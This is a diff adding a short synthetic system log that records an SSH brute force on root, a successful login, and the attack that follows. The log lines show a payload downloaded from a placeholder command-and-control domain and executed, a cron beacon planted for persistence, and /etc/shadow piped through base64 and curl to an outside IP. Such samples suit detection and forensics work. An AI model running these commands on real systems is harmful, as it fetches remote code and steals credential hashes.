@@ -1,0 +1,10 @@
+2024-01-15T03:12:44 hostname sshd[1234]: Failed password for root from 185.220.101.42 port 54321 ssh2
+2024-01-15T03:12:46 hostname sshd[1234]: Failed password for root from 185.220.101.42 port 54322 ssh2
+2024-01-15T03:12:48 hostname sshd[1234]: Failed password for root from 185.220.101.42 port 54323 ssh2
+2024-01-15T03:13:01 hostname sshd[1234]: Accepted password for root from 185.220.101.42 port 54324 ssh2
+2024-01-15T03:13:05 hostname sudo[5678]: root : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/wget http://evil.c2domain.xyz/payload.sh
+2024-01-15T03:13:07 hostname kernel: TCP connection from 185.220.101.42 to 192.168.1.10:22
+2024-01-15T03:13:22 hostname bash[9101]: root executed: chmod +x payload.sh && ./payload.sh
+2024-01-15T03:13:45 hostname cron[1122]: root added crontab: */5 * * * * /tmp/.x/beacon
+2024-01-15T03:14:01 hostname kernel: outbound connection to 185.220.101.42:4444 (ESTABLISHED)
+2024-01-15T03:15:10 hostname auditd: execve: /bin/bash -c "cat /etc/shadow | base64 | curl -s -X POST http://185.220.101.42:8080/exfil -d @-"
